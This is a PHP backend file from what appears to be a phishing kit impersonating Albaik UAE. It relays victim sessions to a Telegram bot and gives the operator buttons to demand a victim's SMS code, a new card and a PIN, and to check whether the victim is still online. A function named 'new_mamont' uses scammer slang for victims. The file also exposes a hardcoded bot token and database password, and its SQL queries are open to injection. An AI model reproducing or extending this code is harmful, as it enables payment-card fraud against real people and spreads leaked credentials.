<?php 

if ( 1 == 1 ) {
	ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
}

define('TOKEN', '7375790466:AAF_VOh1jxFH6fosHoElU7QZ8sXk1IfhBiQ');
$chat_id = '-1002213615078';
$chat_id_s = '-1002213615078';


define('BD_URL', "127.0.0.1");
define('BD_USER', "albaik_uae_s");
define('BD_PASSWORD', "e6SxpHbukLKJrUyo");
define('BD_TABLE', "albaik_uae_s");
define('BD_PORT', 3306);
define('BD_CHARSET', "latin1");

// Кнопки
function keyboard($session) {
    $keyboard = [
    	'inline_keyboard' => [
    		[
    			['text' => '✍🏿 ᴄᴏᴅᴇ', 'callback_data' => 'wait_code_'.$session],
    		], 
    		[
    			['text' => '🎭 ɴᴇᴡ ᴄᴀʀᴅ', 'callback_data' => 'new_card_'.$session],
    		],
    		[
    		    ['text' => '🦠 ᴘɪɴ ᴄᴏᴅᴇ', 'callback_data' => 'pincode_'.$session]
    		],
            [
                ['text' => '👁 ᴏɴʟɪɴᴇ?', 'callback_data' => 'online_'.$session]
            ]
    	]
    ];
    $keyboard = json_encode($keyboard);
    return $keyboard;
}

// Подключение к БД
function connect() 
{
    $link = mysqli_connect(BD_URL, BD_USER, BD_PASSWORD, BD_TABLE, BD_PORT);

    if ($link == false){
        print("Ошибка: Невозможно подключиться к MySQL " . mysqli_connect_error());
    }

    mysqli_set_charset($link, BD_CHARSET);
    return $link;
}

// Получить последнюю активность
function get_online($session) {
    $link = connect();
    
    $sql = "SELECT `last_activity` FROM `data` WHERE `session`='" . $session . "'";
    $result = mysqli_query($link, $sql);
    
    $last_activity = new DateTime(mysqli_fetch_array($result)[0]);
    $datetime = new DateTime(date('Y-m-d h:i:s'));
    $interval = $datetime->getTimestamp() - $last_activity->getTimestamp();
    
    if($interval <= 3){
        return true;
    } else {
        return $interval;
    }
}

// Обновление времени
function update_online($session) {
    $link = connect();
    $datetime = date('Y-m-d h:i:s');
    $sql = "UPDATE `data` SET `last_activity`='" . $datetime . "' WHERE `session`='" . $session . "'";
    $result = mysqli_query($link, $sql);
}

// Получение статуса
function get_status($session) {
    $link = connect();

    $sql = "SELECT `status` FROM `data` WHERE `session`='" . $session . "'";
    $result = mysqli_query($link, $sql);
    
    return mysqli_fetch_array($result)[0];
}

// Создание записи в таблице или обновляет её
function new_mamont($session, $message_id, $status="wait", $online=true) 
{
    $link = connect();
	
    $sql = "SELECT `id` FROM `data` WHERE `session`='" . $session . "'";
    $result = mysqli_query($link, $sql);
    
    $datetime = date('Y-m-d h:i:s');

    if( mysqli_num_rows($result) === 0 ) {
        $sql = "INSERT INTO `data`".
               "(`session`, `status`, `м`, `message_id`, `last_activity`) VALUES ".
               "('" . $session . "','" . $status . "', " . $online . ", " . $message_id . ", '" . $datetime ."')";
    } else {
        $sql = "UPDATE `data` SET `status`='" . $status . "', `message_id`=" . $message_id . ", `last_activity`='" . $datetime . "' WHERE `session`='" . $session . "'";
    }

    $result = mysqli_query($link, $sql);

    if ($result == false) {
        print("Произошла ошибка при выполнении запроса");
    }

    mysqli_close($link);
    return $result;
}

// Функция вызова методов API.
function sendTelegram($method, $response)
{
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/' . $method);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}